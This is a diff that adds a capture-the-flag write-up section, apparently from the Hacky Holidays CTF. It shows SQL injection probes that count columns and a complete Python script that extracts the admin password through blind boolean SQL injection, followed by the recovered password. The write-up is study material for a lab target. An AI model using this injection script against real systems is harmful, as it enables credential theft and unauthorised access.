@@ -260,3 +260,46 @@ When Googling for the Grinch's password hash, it returns: `35d652126ca1706b59db0
 Loggin in with `grinch:BahHumbug`, makes a post visible: `Secret Plans`</br>
 Clicking through, will show the flag.</br>
 
+## Solution 9th flag
+Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!</br>
+
+Going through the quiz process is states there is 1 other player with the same as me.</br>
+There might be SQLi here. Try to enumerate the number of columns in the name field with:
+```
+Jfjrir' union select 1;/*	        0
+Jfjrir' union select 1,2;/*	        0
+Jfjrir' union select 1,2,3;/*	    0
+Jfjrir' union select 1,2,3,4;/*	    1
+```
+
+There are 4 columns in that table as that's the first one returning another user with the same name.</br>
+Sending requests with a proper SQL didn't work and after Googling online I found a script to enumerate a password - credits go to LiamG:</br>
+```
+#!/usr/bin/env python3
+import requests
+
+url='https://hackyholidays.h1ctf.com/evil-quiz'
+cookies={'session': '4fbc0cc824c9ee373d677e1840288aaf'}
+alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./{}:@~<>?'
+
+def attack(password):
+    index=len(password)+1
+    for letter in alphabet:
+        data={'name': "Jfjrir' union select 1,2,3,4 from admin where username ='admin' and ord(substr(password, %d, 1))='%d" % (index, ord(letter))}
+        r = requests.post(url, cookies=cookies, data=data)
+        r = requests.get(url + '/score', cookies=cookies)
+        if 'There is 1 other' in r.text:
+            return password + letter
+    return password
+
+password=''
+while True:
+    np=attack(password)
+    if np == password:
+        print("Password found: '%s'" % (password))
+        break
+    password=np
+```
+Running the above script to retrieve the password resulted in: `S3creT_p4ssw0rd-$`</br>
+
+Logging in with `admin:S3creT_p4ssw0rd-$`, reveals the flag.</br>
